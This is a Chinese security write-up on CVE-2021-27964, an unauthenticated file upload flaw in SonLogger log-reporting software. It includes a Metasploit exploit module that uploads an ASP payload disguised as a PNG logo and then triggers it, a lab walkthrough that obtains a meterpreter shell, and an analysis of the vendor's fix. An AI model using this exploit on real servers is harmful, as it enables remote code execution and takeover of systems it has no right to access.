## **概述**

Sonlogger 是土耳其SFC 公司 开发的一款应用软件，兼容土耳其《第5651号法》，是一款基于 Web 的 SonicWall
防火墙设备日志分析、报告和跟踪软件。《第5651号法》规定了网络服务提供商所应履行的义务，如进行数据本地化，每年向土耳其信息和通信技术管理局（ICTA）提交两次报告等。Sonlogger
用于协助用户生成符合《第5651号法》规定的合规日志。

SonLogger 6.4.1之前的版本存在安全漏洞 (CVE-2021-27964)，允许上传未经授权的任意文件。攻击者可以向
/Config/SaveUploadedHotspotLogoFile 发送 POST
请求，无需任何身份验证或会话头，也并未检查上传文件的扩展名以及文件内容。利用此漏洞，可以上传恶意文件并访问运行该应用程序的远程服务器，从而获取敏感信息。

##  **漏洞细节**

Sonlogger 4.2.3.3的主界面如下：

![1620799945_609b71c96719579c9c6f9.png!small?1620799927057](https://image.3001.net/images/20210512/1620799945_609b71c96719579c9c6f9.png!small?1620799927057)

Sonlogger的 ”热点设置-上传” logo界面如下，可知它并未规定所上传文件的扩展名和内容：

![1620799954_609b71d2429fa45bf9f45.png!small?1620799935904](https://image.3001.net/images/20210512/1620799954_609b71d2429fa45bf9f45.png!small?1620799935904)

下一步，进行上传操作并使用 Burpsuite 监听。发现上传时会向 /Config/SaveUploadedHotspotLogoFile 页面发送
POST 请求。且该请求来于 config/hostspotsettings.js。

![1620799969_609b71e1b318ab2d3afe4.png!small?1620799951502](https://image.3001.net/images/20210512/1620799969_609b71e1b318ab2d3afe4.png!small?1620799951502)

 **PoC**

编写脚本，生成包含有效载荷的ASP，部分代码如下：

    
    
    def create_payloadMsf::Util::EXE.to_exe_asp(generate_payload_exe).to_send​

下面的部分将有效负载上传到目标系统的 /Assets/temp/hotspot/img/logohotspot.asp 并触发它进行连接：

    
    
    def exploitbeginprint_good('Generate Payload')data = create_payload​boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(5..14))}"post_data = "--#{boundary}\r\n"post_data << "Content-Disposition: form-data; name=\"file\"; filename=\"#{rand_text_alphanumeric(rand(5..11))}.asp\"\r\n"post_data << "Content-Type: image/png\r\n"post_data << "\r\n#{data}\r\n"post_data << "--#{boundary}\r\n"​res = send_request_cgi('method' => 'POST','uri' => normalize_uri(target_uri.path, '/Config/SaveUploadedHotspotLogoFile'),'ctype' => "multipart/form-data; boundary=#{boundary}",'data' => post_data,'headers' => {'Accept' => 'application/json','Accept-Language' => 'en-US,en;q=0.5','X-Requested-With' => 'XMLHttpRequest'})unless resfail_with(Failure::Unreachable, 'No response from server')end​unless res.code == 200fail_with(Failure::Unknown, "Unexpected server response: #{res.code}") end​json_res = beginJSON.parse(res.body)rescue JSON::ParserErrornilend​if json_res.nil? || json_res['Message'] == 'Error in saving file'fail_with(Failure::UnexpectedReply, 'Error uploading payload')end​print_good('Payload has been uploaded')​handler​print_status('Executing payload...')send_request_cgi({'uri' => normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),'method' => 'GET'}, 5)end rescue StandardErrorfail_with(Failure::UnexpectedReply, 'Failed to execute the payload')end​

##  **漏洞利用**

使用 VMware 内 kali 虚拟机作为攻击发起主机，以宿主机作为靶机进行攻击。

首先把编写好的脚本放入 metasploit 对应的目录之下，之后在 msfconsole下reload_all 重新载入所有模块，并运行脚本。

![1620799996_609b71fcc127d9e8b8713.png!small](https://image.3001.net/images/20210512/1620799996_609b71fcc127d9e8b8713.png!small)

  

![1620800003_609b7203694832dc5a134.png!small](https://image.3001.net/images/20210512/1620800003_609b7203694832dc5a134.png!small)

检索需利用的 modules，使用 show options 命令查看配置项，并对目标主机RHOSTS, RPORT 等参数进行设置。

![1620800024_609b7218a39617447e7df.png!small?1620800006285](https://image.3001.net/images/20210512/1620800024_609b7218a39617447e7df.png!small?1620800006285)

  

![1620800031_609b721f6b33ef056a738.png!small?1620800013222](https://image.3001.net/images/20210512/1620800031_609b721f6b33ef056a738.png!small?1620800013222)

分别查看攻击机和靶机的ip地址，以确认LHOST 被设置为 192.168.18.128。

![1620800043_609b722b268f519dcb26c.png!small?1620800024785](https://image.3001.net/images/20210512/1620800043_609b722b268f519dcb26c.png!small?1620800024785)

![1620800052_609b72343a3685465071a.png!small?1620800033871](https://image.3001.net/images/20210512/1620800052_609b72343a3685465071a.png!small?1620800033871)

与虚拟机同网段的宿主机 ip 地址为 192.168.18.1，故设置 RHOSTS 为该 ip 地址，并运行脚本。

![1620800062_609b723ef2c83a3f127d4.png!small?1620800044652](https://image.3001.net/images/20210512/1620800062_609b723ef2c83a3f127d4.png!small?1620800044652)

实施 exploit 生成 meterpreter。

![1620800071_609b72474082926e3bee9.png!small?1620800052882](https://image.3001.net/images/20210512/1620800071_609b72474082926e3bee9.png!small?1620800052882)

结果，成功获得了 uid 以及系统信息。

![1620800081_609b7251ac5b8d51bfb87.png!small?1620800063353](https://image.3001.net/images/20210512/1620800081_609b7251ac5b8d51bfb87.png!small?1620800063353)

##  **修复版本分析**

![1620800097_609b726107e3609089382.png!small?1620800080121](https://image.3001.net/images/20210512/1620800097_609b726107e3609089382.png!small?1620800080121)

![1620800104_609b7268185ac443674dd.png!small?1620800085659](https://image.3001.net/images/20210512/1620800104_609b7268185ac443674dd.png!small?1620800085659)

分析发现，修复后版本的 hotspotsetting.js 部分代码如下：

    
    
    var handleLogoDropzone = function () {​Dropzone.autoDiscover = false; // otherwise will be initialized twicevar myDropzoneOptions = {maxFilesize: 5,addRemoveLinks: true,clickable: true,};var myDropzone = new Dropzone('#m-dropzone-three', myDropzoneOptions);var mockFile = { name: $('#hotspotlogonameinput').val(), size: 12345 };myDropzone.options.addedfile.call(myDropzone, mockFile);myDropzone.options.thumbnail.call(myDropzone, mockFile, "../../Assets/hotspot/img/" + $('#hotspotlogonameinput').val() + "?dummy=" + Math.round((new Date()).getTime() / 1000) + "");}​

分析可知，Sonlogger 只会读取来自 Assets/hotspot/img 文件夹内的 logo 缩略图，而实际上传到 Sonlogger 内的
logo 被上传至 Assets/temp/hotspot/img 内，并未真正的修改保存。如下图所示，上传的图片提示保存成功，但刷新后仍然是之前的图片。

![1620800116_609b7274b1b6fa5b8adb0.png!small?1620800099353](https://image.3001.net/images/20210512/1620800116_609b7274b1b6fa5b8adb0.png!small?1620800099353)

反编译最新版本的 dll 也未发现与 uploadedlogo
相关的方法，由此可以看出debug的方式比较简单粗暴。虽然提供的修复方案解决了安全性问题，但也损害了用户自定义 logo 的部分功能。

![1620800127_609b727fb298a78277d87.png!small?1620800109440](https://image.3001.net/images/20210512/1620800127_609b727fb298a78277d87.png!small?1620800109440)

另外，土耳其 RZK 公司旗下的软件 Fortilogger 4.4.2.2
版本也存在原理相似的未授权任意文件上传漏洞，本文不再展开，有兴趣的读者可以自行研究。欢迎在留言区交流。

##  **小结**

大多数网站都有文件上传的接口。但如果在后台开发时没有对上传的文件进行安全考虑或者采用了有缺陷的措施，则会导致攻击者通过一些手段绕过安全措施并上传恶意文件，从而通过访问恶意文件获得WEBSHELL，控制整个后台等，危害等级极高。任意文件上传也是常见的高危漏洞类型之一。

导致 Sonlogger 4.2.3.3
版本产生该漏洞的具体原因在于，代码作者没有对访客提交的数据进行检验或者过滤不严，导致攻击者可以直接提交修改过的数据绕过扩展名的检验，进而利用该漏洞上传任意文件并且远程执行任意代码。

目前Sonlogger已发布了 6.4.1 版本，更新修复了包括该漏洞在内的数个安全问题，也为上传文件接口增加了文件扩展名限制。用户应尽快更新至最新版本。

##  **参考资料**

1\. https://nvd.nist.gov/vuln/detail/CVE-2021-27964

2\. https://www.sonlogger.com/releasenotes

3\. http://packetstormsecurity.com/files/161793/SonLogger-4.2.3.3-Shell-Upload.html

4\. https://github.com/erberkan/SonLogger-vulns

5\. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27964

题图：Pixabay License

